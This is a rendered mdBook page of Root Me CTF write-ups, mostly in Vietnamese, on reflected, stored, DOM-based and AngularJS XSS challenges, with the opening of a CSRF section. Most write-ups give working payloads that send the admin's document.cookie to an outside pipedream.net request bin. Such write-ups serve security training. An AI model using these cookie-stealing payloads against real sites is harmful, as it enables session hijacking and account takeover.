<!DOCTYPE HTML>
<html lang="en" class="ayu sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>RootMe Solutions &amp; Write-Ups</title>
        <meta name="robots" content="noindex">


        <!-- Custom HTML head -->

        <meta name="description" content="RootMe Solutions &amp; Write-Ups for education purposes.">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="favicon-de23e50b.svg">
        <link rel="shortcut icon" href="favicon-8114d1fc.png">
        <link rel="stylesheet" href="css/variables-3865ffda.css">
        <link rel="stylesheet" href="css/general-4c35105a.css">
        <link rel="stylesheet" href="css/chrome-c0e702bf.css">
        <link rel="stylesheet" href="css/print-ad67d350.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome-799aeb25.css">
        <link rel="stylesheet" href="fonts/fonts-9644e21d.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" id="highlight-css" href="highlight-493f70e1.css">
        <link rel="stylesheet" id="tomorrow-night-css" href="tomorrow-night-4c0ae647.css">
        <link rel="stylesheet" id="ayu-highlight-css" href="ayu-highlight-56612340.css">

        <!-- Custom theme stylesheets -->
        <link rel="stylesheet" href="css/image-zoom-a9a84c82.css">


        <!-- Provide site root and default themes to javascript -->
        <script>
            const path_to_root = "";
            const default_light_theme = "ayu";
            const default_dark_theme = "ayu";
            window.path_to_searchindex_js = "searchindex-db75bb8b.js";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="toc-668db0a3.js"></script>
    </head>
    <body>
    <div id="mdbook-help-container">
        <div id="mdbook-help-popup">
            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
            <div>
                <p>Press <kbd>‚Üê</kbd> or <kbd>‚Üí</kbd> to navigate between chapters</p>
                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
                <p>Press <kbd>?</kbd> to show this help</p>
                <p>Press <kbd>Esc</kbd> to hide this help</p>
            </div>
        </div>
    </div>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                let theme = localStorage.getItem('mdbook-theme');
                let sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
            let theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('ayu')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            let sidebar = null;
            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
                sidebar_toggle.checked = false;
            }
            if (sidebar === 'visible') {
                sidebar_toggle.checked = true;
            } else {
                html.classList.remove('sidebar-visible');
            }
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">RootMe Solutions &amp; Write-Ups</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                        <a href="https://github.com/nh4ttruong/emtoor" title="Git repository" aria-label="Git repository">
                            <i id="git-repository-button" class="fa fa-github"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <div class="search-wrapper">
                            <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                            <div class="spinner-wrapper">
                                <i class="fa fa-spinner fa-spin"></i>
                            </div>
                        </div>
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="root-me-solutions--write-ups"><a class="header" href="#root-me-solutions--write-ups">Root Me Solutions &amp; Write-ups</a></h1>
<p>This repository offers write-ups and solutions for <a href="https://nh4ttruong.github.io/emtoor">Root Me CTF challenges</a>, aimed at educational and ethical hacking practice. It provides step-by-step guides for various web security, application security, and digital forensics challenges.</p>
<blockquote>
<p>Please read the <a href="https://nh4ttruong.github.io/emtoor/disclaimer.html"><strong>Disclaimer</strong></a> before "dive" into the challenges.</p>
</blockquote>
<hr />
<h2 id="categories"><a class="header" href="#categories">Categories</a></h2>
<p>This repository is organized into several categories, each focusing on different aspects of cybersecurity challenges:</p>
<div class="table-wrapper"><table><thead><tr><th>Category</th><th>Description</th></tr></thead><tbody>
<tr><td>Cross-Site Scripting</td><td>XSS attack techniques &amp; solutions</td></tr>
<tr><td>CSRF</td><td>Cross-Site Request Forgery</td></tr>
<tr><td>PHP Vulnerabilities</td><td>File inclusion, upload, etc.</td></tr>
<tr><td>SQL Injection</td><td>SQLi types and bypasses</td></tr>
<tr><td>Steganography</td><td>Hidden data in files/images</td></tr>
<tr><td>Forensics</td><td>Digital forensics challenges</td></tr>
</tbody></table>
</div>
<blockquote>
<p>This is just my solution approach and it may not be correct at the time you attempt the challenge.</p>
</blockquote>
<blockquote>
<p>üö©Flags are redacted for compliance. Guides are detailed for self-learning and education purpose only.</p>
</blockquote>
<hr />
<h2 id="contributors"><a class="header" href="#contributors">Contributors</a></h2>
<ul>
<li><a href="https://github.com/nh4ttruong">GitHub: nh4ttruong</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cross-site-scripting-xss-challenges"><a class="header" href="#cross-site-scripting-xss-challenges">Cross-Site Scripting (XSS) Challenges</a></h1>
<p>This section contains write-ups for Root Me XSS challenges. Each solution demonstrates exploitation techniques and provides step-by-step guidance.</p>
<div class="table-wrapper"><table><thead><tr><th>Challenge Name</th><th>Write-up Link</th></tr></thead><tbody>
<tr><td>XSS - Reflected</td><td><a href="Cross-Site-Scripting/./XSS-Reflected/XSS-Reflected.html">Read more</a></td></tr>
<tr><td>XSS - Stored 1</td><td><a href="Cross-Site-Scripting/./XSS-Stored1/XSS-Stored1.html">Read more</a></td></tr>
<tr><td>XSS - Stored 2</td><td><a href="Cross-Site-Scripting/./XSS-Stored2/XSS-Stored2.html">Read more</a></td></tr>
<tr><td>XSS DOM Based - Introduction</td><td><a href="Cross-Site-Scripting/./XSSDOMBased-Introduction/XSSDOMBased-Introduction.html">Read more</a></td></tr>
<tr><td>XSS DOM Based - Eval</td><td><a href="Cross-Site-Scripting/./XSS-DOMBased-Eval/XSS-DOMBased-Eval.html">Read more</a></td></tr>
<tr><td>XSS DOM Based - AngularJS</td><td><a href="Cross-Site-Scripting/./XSSDOMBased-Angular/XSSDOMBased-Angular.html">Read more</a></td></tr>
</tbody></table>
</div>
<blockquote>
<p>üí° For each challenge, see the respective folder for screenshots and payloads.</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h1 id="xss-dom-based---eval"><a class="header" href="#xss-dom-based---eval"><a href="https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Eval"><strong>XSS DOM Based - Eval</strong></a></a></h1>
<p>B√†i n√†y c·∫ßn ta th·ª±c hi·ªán ch√®n XSS v√†o m·ªôt input t√≠nh to√°n v√† b·ªã filter b·ªüi regex: <code>/^\d+\[\\+|\\-|\\\*|\\/\]\d+/</code></p>
<p><img src="Cross-Site-Scripting/XSS-DOMBased-Eval/./media/image1.png" alt="" /></p>
<p>Tuy v·∫≠y, sau khi fuzz th√¨ th·∫•y <strong>eval()</strong> cho ph√©p th·ª±c thi ph√©p to√°n <strong>1+1asd:</strong></p>
<p><img src="Cross-Site-Scripting/XSS-DOMBased-Eval/./media/image2.png" alt="" /></p>
<p>Nh∆∞ v·∫≠y, h∆∞·ªõng ƒëi c·ªßa ta l√† ch√®n v√†o ·ªü ƒë√¢y. Ta c√≥ script c·ªßa server:</p>
<pre><code class="language-javascript">&amp;lt;script&amp;gt;

var result = eval(1+1asd);

document.getElementById('state').innerText = '1+1asd = ' + result;

&amp;lt;/script&amp;gt;
</code></pre>
<p>M·ªçi th·ª© ƒë·ªÅu b·ªã filter khi c·ªë ch√®n script v√†o ƒë√¢y. ƒê·∫øn ƒë√¢y, sau khi m√≤ v·ªÅ Javascript th√¨ m·ªçi th·ª© c√≥ th·ªÉ gi·∫£i quy·∫øt v·ªõi template literals (<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals">Template literals (Template strings) - JavaScript | MDN (mozilla.org)</a>). Template literals cho ph√©p ta th·ª±c thi m·ªôt command d∆∞·ªõi d·∫°ng ∆∞u ti√™n tr∆∞·ªõc khi b·ªã block (n·∫øu c√≥):</p>
<p>Th·ª≠ ch√®n payload:</p>
<pre><code class="language-bash">1+1\`${alert\`\`}\`
</code></pre>
<p><img src="Cross-Site-Scripting/XSS-DOMBased-Eval/./media/image3.png" alt="" /></p>
<p>V√† nh∆∞ v·∫≠y, ta c√≥ th·ªÉ ƒë√≠nh k√®m DOM Based v√†o ƒë√¢y:</p>
<p>Payload:</p>
<pre><code class="language-bash">1+1\`${document.location="https://eol9dtzbk9673pb.m.pipedream.net?c="+document.cookie}\`
</code></pre>
<p>Sau 10 gi√¢y, ta nh·∫≠n ƒë∆∞·ª£c HTTP request. Gi·ªù th√¨ chuy·ªÉn qua tab Contact v√† send cho admin. Ta c√≥ payload nh∆∞ sau: <a href="http://challenge01.root-me.org/web-client/ch34/index.php?calculation=1%2B1%60$%7bdocument.location=%22https://eol9dtzbk9673pb.m.pipedream.net?c=%22%2Bdocument.cookie%7d%60"><em>http://challenge01.root-me.org/web-client/ch34/index.php?calculation=1%2B1`${document.location=%22https://eol9dtzbk9673pb.m.pipedream.net?c=%22%2Bdocument.cookie}`</em></a></p>
<p><img src="Cross-Site-Scripting/XSS-DOMBased-Eval/./media/image4.png" alt="" /></p>
<p>HTTP Request nh·∫≠n ƒë∆∞·ª£c sau m·ªôt kho·∫£ng th·ªùi gian:</p>
<p><img src="Cross-Site-Scripting/XSS-DOMBased-Eval/./media/image5.png" alt="" /></p>
<p>Done:</p>
<p><img src="Cross-Site-Scripting/XSS-DOMBased-Eval/./media/image6.png" alt="" /></p>
<ul>
<li>Flag: "****************************"</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="xss-reflected"><a class="header" href="#xss-reflected"><a href="https://www.root-me.org/en/Challenges/Web-Client/XSS-Reflected">XSS Reflected</a></a></h1>
<p>Ki·ªÉm tra source website ta th·∫•y web b·ªã comment 1 th·∫ª &lt;<a>&gt; d·∫´n ƒë·∫øn <code>?p=security</code>:</p>
<p><img src="Cross-Site-Scripting/XSS-Reflected/./media/image1.png" alt="" /></p>
<p>Request ƒë·∫øn <code>?p=security</code>, website hi·ªÉn th·ªã trang web l·ªói v√† c√≥ m·ªôt hyperlink th·∫ª <code>&lt;a&gt;</code> hi·ªÉn th·ªã n·ªôi dung <code>security</code>:</p>
<p><img src="Cross-Site-Scripting/XSS-Reflected/./media/image2.png" alt="" /></p>
<p>Th·ª≠ nh·∫≠p <code>?p=&lt;gi√° tr·ªã kh√°c&gt;</code>, page s·∫Ω b√°o l·ªói v√† hi·ªÉn th·ªã n·ªôi dung <code>&lt;gi√° tr·ªã kh√°c&gt;</code> trong th·∫ª <code>&lt;a&gt;</code>. Nh∆∞ v·∫≠y, l·ª£i d·ª•ng th·∫ª <code>&lt;a&gt;</code> n√†y, ta th·ª±c hi·ªán ƒë√≥ng quote c≈©ng nh∆∞ ch√®n th√™m event ƒë·ªÉ th·ª±c hi·ªán XSS:</p>
<p><img src="Cross-Site-Scripting/XSS-Reflected/./media/image3.png" alt="" /></p>
<p>ƒê·∫øn ƒë√¢y, sau khi th·ª≠ get tr·ª±c ti·∫øp document.cookie nh∆∞ng kh√¥ng c√≥ gi√° tr·ªã, ta th·ª±c hi·ªán g·ª≠i HTTP Request v√† qua RequestBin ch·ªù cookie.</p>
<p>Payload: <a href="http://challenge01.root-me.org/web-client/ch26/?p=nh4ttruong%27%20onmouseover=%27document.location=%22https://eol9dtzbk9673pb.m.pipedream.net?%22.concat(document.cookie)">http://challenge01.root-me.org/web-client/ch26/?p=nh4ttruong%27%20onmouseover=%27document.location=%22https://eol9dtzbk9673pb.m.pipedream.net?%22.concat(document.cookie)</a></p>
<p>Th·ª±c hi·ªán request v·ªõi payload, sau ƒë√≥ ta trigger event <code>onmouseover</code> v√† di chuy·ªÉn chu·ªôt qua th·∫ª <code>&lt;a&gt;</code> ƒë·ªÉ chuy·ªÉn h∆∞·ªõng website:</p>
<p><img src="Cross-Site-Scripting/XSS-Reflected/./media/image4.png" alt="" /></p>
<p>Sau ƒë√≥, ta th·ª±c hi·ªán l·∫°i m·ªôt l·∫ßn n·ªØa nh∆∞ng s·∫Ω th·ª±c hi·ªán th√™m b∆∞·ªõc Report ƒë·∫øn admin ƒë·ªÉn POST request:</p>
<p><img src="Cross-Site-Scripting/XSS-Reflected/./media/image5.png" alt="" /></p>
<p><img src="Cross-Site-Scripting/XSS-Reflected/./media/image6.png" alt="" /></p>
<p>Qua <strong>RequestBin</strong> v√† nh·∫≠n flag:</p>
<p><img src="Cross-Site-Scripting/XSS-Reflected/./media/image7.png" alt="" /></p>
<ul>
<li>Flag: "****************************"</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="xss--stored-1"><a class="header" href="#xss--stored-1"><a href="https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1">XSS ‚Äì Stored 1</a></a></h1>
<p>Challenge y√™u c·∫ßu ta th·ª±c hi·ªán ƒë√°nh c·∫Øp cookie phi√™n qu·∫£n tr·ªã vi√™n v√† cung c·∫•p cho ta m·ªôt website ƒë·ªÉ ƒëƒÉng post:</p>
<p><img src="Cross-Site-Scripting/XSS-Stored1/./media/image1.png" alt="" /></p>
<p>Ki·ªÉm tra source th√¨ th·∫•y ƒë√¢y l√† m·ªôt form v·ªõi ph∆∞∆°ng th·ª©c <strong>‚ÄúPOST‚Äù</strong>. Nh∆∞ t√™n ƒë·ªÅ b√†i, ta s·∫Ω th·ª±c hi·ªán XSS Stored v√†o input. Nh∆∞ng tr∆∞·ªõc h·∫øt ta ki·ªÉm tra xem n√≥ b·ªã XSS ·ªü ƒë√¢u, ta ƒë∆∞·ª£c k·∫øt qu·∫£ l√† n√≥ b·ªã t·∫°i √¥ input <strong>‚ÄòMessage‚Äô</strong>:</p>
<p><img src="Cross-Site-Scripting/XSS-Stored1/./media/image2.png" alt="" /></p>
<p><img src="Cross-Site-Scripting/XSS-Stored1/./media/image3.png" alt="" /></p>
<p>ƒê·∫ßu ti√™n, ta th·ª±c hi·ªán t·∫°o m·ªôt n∆°i ƒë·ªÉ c√≥ th·ªÉ thu th·∫≠p c√°c HTTP Request v·ªõi https://requestbin.in:</p>
<p><img src="Cross-Site-Scripting/XSS-Stored1/./media/image4.png" alt="" /></p>
<p>Nh∆∞ v·∫≠y, ta c√≥ m·ªôt requestbin t·∫°i https://eojx5xx99skfihj.m.pipedream.net:</p>
<p>Ti·∫øp theo, ta c√≥ th·ªÉ ƒëo√°n ƒë∆∞·ª£c ch·∫Øc ch·∫Øn Forum v0.001 website n√†y b·ªã XSS, do v·∫≠y, ta th·ª±c hi·ªán vi·∫øt payload ƒë·ªÉ attack v√†o input c·ªßa form n√†y:</p>
<p>Payload:</p>
<pre><code class="language-javascript">&lt;script&gt;&lt;/script&gt;document.write("&lt;img src='https://eojx5xx99skfihj.m.pipedream.net/"+document.cookie+"'&gt;&lt;/img&gt;");&lt;/script&gt;
</code></pre>
<p><img src="Cross-Site-Scripting/XSS-Stored1/./media/image5.png" alt="" /></p>
<p><img src="Cross-Site-Scripting/XSS-Stored1/./media/image6.png" alt="" /></p>
<p>Ki·ªÉm tra request bin, ta nh·∫≠n ƒë∆∞·ª£c gi√° tr·ªã ADMIN_COOKIE.</p>
<p><img src="Cross-Site-Scripting/XSS-Stored1/./media/image7.png" alt="" /></p>
<ul>
<li>Flag: "****************************"</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="xss--stored-2"><a class="header" href="#xss--stored-2"><a href="https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-2">XSS ‚Äì Stored 2</a></a></h1>
<p>Th·ª≠ fuzz c√°c payload ·ªü tab Admin v√† Post nh∆∞ng kh√¥ng c√≥ g√¨ x·∫£y ra. Ki·ªÉm tra v√† test th·ª≠ th√¨ th·∫•y ƒëi·ªÅu ƒë·∫∑c bi·ªát l√† <strong>Status: invite</strong> ·ªü m·ªói post.</p>
<p><img src="Cross-Site-Scripting/XSS-Stored2/./media/image1.png" alt="" /></p>
<p>Check cookie c·ªßa website th√¨ th·∫•y n√≥ ƒë∆∞·ª£c handle d·ª±a tr√™n cookie n√†y:</p>
<p><img src="Cross-Site-Scripting/XSS-Stored2/./media/image2.png" alt="" /></p>
<p>B·ªè v√†o repeater v√† check th·ª≠ th√¨ th·∫•y n√≥ work:</p>
<p><img src="Cross-Site-Scripting/XSS-Stored2/./media/image3.png" alt="" /></p>
<p>·ªû ƒë√¢y, class <strong>‚Äúnh4ttruong‚Äù</strong> s·∫Ω l√† ƒëi·ªÉm ƒë√≠ch ta t·∫•n c√¥ng. Th·ª≠ nh√©t payload XSS v√†o th·ª≠:</p>
<p><strong>Payload:</strong> <code>hehe"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p><img src="Cross-Site-Scripting/XSS-Stored2/./media/image4.png" alt="" /></p>
<p><img src="Cross-Site-Scripting/XSS-Stored2/./media/image5.png" alt="" /></p>
<p>T·ª´ ƒë√≥, ta ƒë√£ c√≥ ch·ªó ƒë·ªÉ ti√™m XSS v√†o r·ªìi. T∆∞∆°ng t·ª± c√°c b√†i stored, ta t·∫°o request bin v√† b∆°m v√†o:</p>
<p><strong>Payload:</strong> <code>"&gt;&lt;script&gt;document.write("&lt;img src=https://eol9dtzbk9673pb.m.pipedream.net?cookie=%22.concat(document.cookie).concat(%22/&gt;%22))&lt;/script&gt;</code></p>
<p>Cookie tr·∫£ v·ªÅ c√≥ v·∫ª v·∫´n ch∆∞a nh·∫≠n ƒë∆∞·ª£c. Nh∆∞ng referer tr·∫£ v·ªÅ ?admin=1&amp;idx=0. N√≥i l√™n r·∫±ng n√≥ ƒë√£ ƒëi ƒë√∫ng h∆∞·ªõng v√† admin ƒë√£ ƒë·ªçc ƒë∆∞·ª£c:</p>
<p><img src="Cross-Site-Scripting/XSS-Stored2/./media/image6.png" alt="" /></p>
<p>M·ªü intercept ki·ªÉm tra source v·ªõi payload t∆∞∆°ng t·ª± th√¨ ph√°t hi·ªán cookie=status=invite;‚Äù k·∫øt th√∫c b·∫±ng ‚Äú ‚Äù, do ƒë√≥, r·∫•t c√≥ th·ªÉ n√≥ kh√¥ng link ƒë∆∞·ª£c ƒë·∫øn cookie c·ªßa admin</p>
<p><img src="Cross-Site-Scripting/XSS-Stored2/./media/image7.png" alt="" /></p>
<p>ƒê·ªÉ gi·∫£i quy·∫øt ƒëi·ªÅu n√†y, ta th·ª≠ s·ª≠ d·ª•ng h√†m <strong>REPLACE</strong> ƒë·ªÉ x√≥a b·ªè <strong>‚Äú ‚Äù</strong> v√† ch√®n v√†o k√Ω t·ª± <strong>‚Äú&amp;‚Äù</strong> ƒë·ªÉ link c√°c cookie v·ªõi nhau:</p>
<p><strong>Payload:</strong> <em>"&gt;<script>document.write("&lt;img src=https://eol9dtzbk9673pb.m.pipedream.net?cookie=%22.concat(document.cookie.replace(%27 %27,%27&amp;%27 ).concat(%22/&gt;%22))</script></em></p>
<p><img src="Cross-Site-Scripting/XSS-Stored2/./media/image8.png" alt="" /></p>
<p>C√≥ <strong>ADMIN_COOKIE</strong>, ta thay ƒë·ªïi v√†o cookie v√† get pass:</p>
<p><img src="Cross-Site-Scripting/XSS-Stored2/./media/image9.png" alt="" /></p>
<p><img src="Cross-Site-Scripting/XSS-Stored2/./media/image10.png" alt="" /></p>
<ul>
<li>Flag: "****************************"</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="xss-dom-based---angular"><a class="header" href="#xss-dom-based---angular"><a href="https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-AngularJS">XSS DOM Based - Angular</a></a></h1>
<p>Th·ª≠ submit gi√° v·ªã v√†o input, ta xem ƒë∆∞·ª£c script m√† website handle:</p>
<p><img src="Cross-Site-Scripting/XSSDOMBased-Angular/./media/image1.png" alt="" /></p>
<p>M·∫•t kh√° nhi·ªÅu th·ªùi gian ƒë·ªÉ tr√°nh filter v√† hi·ªÉu code. C√≥ v·∫ª kh√¥ng th·ªÉ attack b·∫±ng c√°ch ‚Äúhi·ªÉu‚Äù code ƒë∆∞·ª£c. ƒê·ªÅ b√†i c√≥ t√™n l√† <strong>AngularJS,</strong> tra c·ª©u cheatsheet XSS Angular, ta c√≥ th·ªÉ t√¨m ƒë∆∞·ª£c payload: <strong>$on.constructor('alert(1)')()</strong></p>
<p>ƒê·ªÉ khi·∫øn JS th·ª±c thi command, ta ch√®n <code>{{ }}</code> ƒë·ªÉ tri·ªÉn khai expression:</p>
<p><strong>{{$on.constructor('alert(1)')()}}</strong></p>
<p>Tuy v·∫≠y, l√∫c ch√®n payload, website tr·∫£ v·ªÅ:</p>
<p><img src="Cross-Site-Scripting/XSSDOMBased-Angular/./media/image2.png" alt="" /></p>
<p>Th·ª≠ thay <strong>' "</strong> th√¨ ƒë√£ ch√®n th√†nh c√¥ng script:</p>
<p><img src="Cross-Site-Scripting/XSSDOMBased-Angular/./media/image3.png" alt="" /></p>
<p>Ch·ªânh s·ª≠a payload ƒë·ªÉ th·ª±c thi DOM Based XSS attack. Ta s·ª≠ d·ª•ng <strong>\"</strong> ƒë·ªÉ tho√°t chu·ªói <strong>"":</strong></p>
<p>Payload: <strong>{{$on.constructor("document.location=\"https://eol9dtzbk9673pb.m.pipedream.net?cookie=\"+document.cookie")()}}</strong></p>
<p><img src="Cross-Site-Scripting/XSSDOMBased-Angular/./media/image4.png" alt="" /></p>
<p>Payload ƒë√£ ch·∫°y ƒë∆∞·ª£c. Gi·ªù th√¨ g·ª≠i payload ƒë·∫øn admin qua Contact tab:</p>
<p><a href="http://challenge01.root-me.org/web-client/ch35/?name=%7b%7b$on.constructor(%22document.location=%22https://eol9dtzbk9673pb.m.pipedream.net?cookie=%22%20document.cookie%22)()%7d%7d"><em>http://challenge01.root-me.org/web-client/ch35/?name={{$on.constructor("document.location=\"https://eol9dtzbk9673pb.m.pipedream.net?cookie=\"%20document.cookie")()}}</em></a></p>
<p><img src="Cross-Site-Scripting/XSSDOMBased-Angular/./media/image5.png" alt="" /></p>
<p>HTTP Request nh·∫≠n v·ªÅ:</p>
<p><img src="Cross-Site-Scripting/XSSDOMBased-Angular/./media/image6.png" alt="" /></p>
<p><img src="Cross-Site-Scripting/XSSDOMBased-Angular/./media/image7.png" alt="" /></p>
<ul>
<li>Flag: "****************************"</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="xss-dom-based---introduction"><a class="header" href="#xss-dom-based---introduction"><a href="https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Introduction">XSS DOM Based - Introduction</a></a></h1>
<p>Sau khi th·ª≠ submit, th√¨ ta c√≥ th·ªÉ xem ƒë∆∞·ª£c script c·ªßa website:</p>
<p><img src="Cross-Site-Scripting/XSSDOMBased-Introduction/./media/image1.png" alt="" /></p>
<p>L√∫c n√†y, tham s·ªë number s·∫Ω ƒë·∫£m nh·∫≠n nh·∫≠n input. Ta th·ª≠ ki·ªÉm tra XSS ·ªü √¥ n√†y b·∫±ng payload <code>‚Äò;alert(1)//</code> th√¨ th·∫•y th√†nh c√¥ng:</p>
<p><img src="Cross-Site-Scripting/XSSDOMBased-Introduction/./media/image2.png" alt="" /></p>
<p>Ta s·∫Ω d√πng document.location ƒë·ªÉ redirect website ƒë·∫øn HTTP Request v√† payload ƒë·ªÉ DOM based XSS nh∆∞ sau (ta d√πng RequestBin t·∫°o t·ª´ https://requestbin.in): <code>';document.location=%27https://eol9dtzbk9673pb.m.pipedream.net/?cookies=%27%2bdocument.cookie;//</code></p>
<p><img src="Cross-Site-Scripting/XSSDOMBased-Introduction/./media/image3.png" alt="" /></p>
<p>Website ƒë√£ chuy·ªÉn h∆∞·ªõng th√†nh c√¥ng, gi·ªù ta s·∫Ω th·ª±c hi·ªán POST l√™n b·∫±ng form b√™n tag contact:</p>
<p><img src="Cross-Site-Scripting/XSSDOMBased-Introduction/./media/image4.png" alt="" /></p>
<p>Ta th·ª±c hi·ªán ƒëi·ªÅn payload b√™n d∆∞·ªõi ƒë·∫øn POST l√™n v√† ƒë·ª£i cookie ƒë∆∞·ª£c tr·∫£ v·ªÅ t·∫°i RequestBin:</p>
<p><a href="http://challenge01.root-me.org/web-client/ch32/?number=%27;document.location=%27https://eol9dtzbk9673pb.m.pipedream.net/?cookies=%27%2bdocument.cookie//">http://challenge01.root-me.org/web-client/ch32/?number=%27;document.location=%27https://eol9dtzbk9673pb.m.pipedream.net/?cookies=%27%2bdocument.cookie//</a></p>
<p><img src="Cross-Site-Scripting/XSSDOMBased-Introduction/./media/image5.png" alt="" /></p>
<ul>
<li>Flag: "****************************"</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="csrf-challenges"><a class="header" href="#csrf-challenges">CSRF Challenges</a></h1>
<p>Write-ups for Root Me CSRF (Cross-Site Request Forgery) challenges. Each guide explains the vulnerability and exploitation steps.</p>
<div class="table-wrapper"><table><thead><tr><th>Challenge Name</th><th>Write-up Link</th></tr></thead><tbody>
<tr><td>CSRF 0 protection</td><td><a href="CSRF/./CSRF0protection/CSRF0protection.html">Read more</a></td></tr>
<tr><td>CSRF token bypass</td><td><a href="CSRF/./CSRFtokenbypass/CSRFtokenbypass.html">Read more</a></td></tr>
</tbody></table>
</div>
<blockquote>
<p>üí° Explore each folder for detailed explanations and screenshots.</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h1 id="csrf---0-protection"><a class="header" href="#csrf---0-protection"><a href="https://www.root-me.org/en/Challenges/Web-Client/CSRF-0-protection">CSRF - 0 protection</a></a></h1>
<p>T·∫°o t√†i kho·∫£n v√† login v√†o website:</p>
<p><img src="CSRF/CSRF0protection/./media/image1.png" alt="" /></p>
<p>·ªû tab Profile, khi ta th·ª±c hi·ªán submit th·ª≠ th√¨ nh·∫≠n ƒë∆∞·ª£c message:</p>
<p><img src="CSRF/CSRF0protection/./media/image2.png" alt="" /></p>
<p>·ªû tab Contact, ta c√≥ th·ªÉ th·∫•y form v·ªõi <code>method=‚Äúpost‚Äù</code>, submit th·ª≠ th√¨ ta nh·∫≠n ƒë∆∞·ª£c message:</p>
<p><img src="CSRF/CSRF0protection/./media/image3.png" alt="" /></p>
<p>Qua tab Private, ta th·∫•y message:</p>
<p><img src="CSRF/CSRF0protection/./media/image4.png" alt="" /></p>
